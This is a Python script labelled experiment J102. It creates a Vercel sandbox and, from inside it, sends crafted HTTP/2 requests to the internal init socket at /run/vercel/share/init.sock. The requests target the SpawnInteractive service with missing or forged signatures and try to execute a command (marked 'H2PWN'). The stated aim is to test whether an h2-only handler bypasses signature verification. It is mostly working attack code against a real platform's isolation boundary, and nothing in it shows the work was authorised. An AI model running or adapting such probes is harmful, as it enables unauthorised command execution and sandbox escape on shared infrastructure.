# 实验J102: HTTP/2 prior-knowledge 测 SpawnInteractive — 505 背后的 h2-only 处理器是否绕过签名
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj102"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import subprocess, base64, time, struct, json

SIG = base64.b64encode(b"\x99" * 64).decode()
TS = str(int(time.time() * 1000))

def frame(body):
    return b"\x00" + struct.pack(">I", len(body)) + body

def probe_h2(path, body, sig=None, ctype="application/connect+json"):
    cmd = ["curl", "-sS", "-m", "8", "-i", "--http2-prior-knowledge", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: " + ctype,
           "-H", "Connect-Protocol-Version: 1",
           "-H", "x-timestamp: " + TS]
    if sig is not None:
        cmd += ["-H", "x-signature: " + sig]
    cmd += ["--data-binary", "@-", "http://localhost" + path]
    try:
        r = subprocess.run(cmd, input=body, capture_output=True, timeout=12)
        return (r.stdout + r.stderr).decode(errors="replace")[:350].replace("\r\n", " | ")
    except Exception as e:
        return f"EXC({e})"

print("== [1] SpawnInteractive h2 无签名 ==", flush=True)
print(probe_h2("/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive", frame(b"{}")), flush=True)

print("== [2] SpawnInteractive h2 假签名 ==", flush=True)
print(probe_h2("/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive", frame(b"{}"), SIG), flush=True)

print("== [3] SpawnInteractive h2 假签名 + PTY 命令 ==", flush=True)
body = frame(json.dumps({"command": "echo", "arguments": ["H2PWN"], "environment": {}, "workingDirectory": "/tmp"}).encode())
print(probe_h2("/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive", body, SIG), flush=True)

print("== [4] Ping h2 (对照) ==", flush=True)
print(probe_h2("/vercel.sandbox.spawn.v1.SpawnService/Ping", frame(b"{}")), flush=True)

print("== [5] Spawn h2 (对照, 应 unauthenticated) ==", flush=True)
print(probe_h2("/vercel.sandbox.spawn.v1.SpawnService/Spawn", frame(b"{}")), flush=True)

print("== [6] grpc content-type h2 测 Interactive ==", flush=True)
print(probe_h2("/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive", frame(b"{}"), SIG, "application/grpc+json"), flush=True)

print("== [7] grpc content-type h1 测 Ping (415 是否 ctype 相关) ==", flush=True)
cmd = ["curl", "-sS", "-m", "6", "-i", "-X", "POST",
       "--unix-socket", "/run/vercel/share/init.sock",
       "-H", "Content-Type: application/grpc+json",
       "-H", "Connect-Protocol-Version: 1",
       "-H", "x-timestamp: " + TS,
       "--data-binary", "@-",
       "http://localhost/vercel.sandbox.spawn.v1.SpawnService/Ping"]
try:
    r = subprocess.run(cmd, input=frame(b"{}"), capture_output=True, timeout=10)
    print((r.stdout + r.stderr).decode(errors="replace")[:300].replace("\r\n", " | "), flush=True)
except Exception as e:
    print(f"EXC({e})", flush=True)

print("== [8] 无帧头 h2 测 Interactive (原始 body) ==", flush=True)
print(probe_h2("/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive", b"{}", SIG), flush=True)
"""
run_cmd(sid, PROBE, "h2-interactive", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
